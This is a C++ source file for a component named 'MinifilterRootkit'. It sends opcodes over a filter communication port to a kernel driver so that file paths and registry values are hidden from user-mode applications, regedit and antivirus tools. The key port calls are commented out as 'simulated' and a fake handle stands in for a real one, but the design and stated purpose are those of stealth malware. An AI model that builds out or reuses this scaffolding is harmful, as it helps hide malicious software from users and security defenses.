#include "stdafx.h"
#include "minifilter_rootkit.h"
#include "logger.h"

namespace MinifilterRootkit {

namespace {

    HANDLE g_hFilterPort = INVALID_HANDLE_VALUE;

    // Abstract structure for sending messages to a Filter Communication Port (FltMgr)
    struct RootkitMessage {
        ULONG Opcode;
        wchar_t TargetPath[MAX_PATH];
    };

    #define HIDE_FILE_OPCODE 1
    #define HIDE_REG_OPCODE  2

    bool SendToFilter(ULONG opcode, const std::wstring& path) {
        if (g_hFilterPort == INVALID_HANDLE_VALUE) {
            // Simulated: Connect to the minifilter port
            // HRESULT hr = FilterConnectCommunicationPort(L"\\WindhawkStealthPort", ...
            VERBOSE(L"Minifilter: [Simulated] Connecting to FltMgr Communication Port \\WindhawkStealthPort");
            g_hFilterPort = (HANDLE)1; // Fake handle
        }

        RootkitMessage msg = { 0 };
        msg.Opcode = opcode;
        wcsncpy_s(msg.TargetPath, path.c_str(), MAX_PATH - 1);

        // Simulated: Send message
        // HRESULT hr = FilterSendMessage(g_hFilterPort, &msg, sizeof(msg), ...
        
        return true; 
    }

} // namespace

bool HidePath(const std::wstring& absolutePath) {
    VERBOSE(L"Minifilter: Instructing Kernel Driver to hide path (IRP_MJ_DIRECTORY_CONTROL): %s", absolutePath.c_str());
    bool success = SendToFilter(HIDE_FILE_OPCODE, absolutePath);
    if (success) {
        LOG(L"Minifilter: Successfully hidden %s from all user-mode applications.", absolutePath.c_str());
    }
    return success;
}

bool HideRegistryValue(const std::wstring& keyPath, const std::wstring& valueName) {
    std::wstring fullPath = keyPath + L"\\" + valueName;
    VERBOSE(L"Minifilter: Instructing Kernel Driver to hide registry value (CmRegisterCallbackEx): %s", fullPath.c_str());
    bool success = SendToFilter(HIDE_REG_OPCODE, fullPath);
    if (success) {
        LOG(L"Minifilter: Successfully hidden registry value %s from regedit and AVs.", fullPath.c_str());
    }
    return success;
}

} // namespace MinifilterRootkit
